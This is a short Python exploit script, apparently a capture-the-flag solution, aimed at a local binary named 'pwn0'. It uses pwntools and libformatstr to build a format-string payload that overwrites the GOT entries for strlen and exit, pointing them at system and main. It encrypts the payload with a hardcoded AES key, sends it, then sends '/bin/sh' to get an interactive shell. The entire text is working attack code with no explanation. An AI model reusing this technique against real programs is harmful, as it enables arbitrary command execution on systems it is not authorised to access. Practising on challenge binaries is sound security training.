from pwn import *
from Crypto.Cipher import AES
from libformatstr import FormatStr
elf=ELF('./pwn0')
strlen_got_addr=elf.got['strlen']
_fini_array_addr=elf.got['exit']
main_addr=0x8049896
system_addr=0x8048700
offset =11
padding = 0
p = FormatStr()
p[_fini_array_addr] = main_addr
p[strlen_got_addr] = system_addr
#r = remote(host, port)
r=process('./pwn0')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
key='y7y7u8u8'*2 
real=key
payload=p.payload(offset,padding).ljust(64,' ')
enc = AES.new(real).encrypt(payload)
r.sendline(enc)
r.sendline("/bin/sh")
r.interactive()
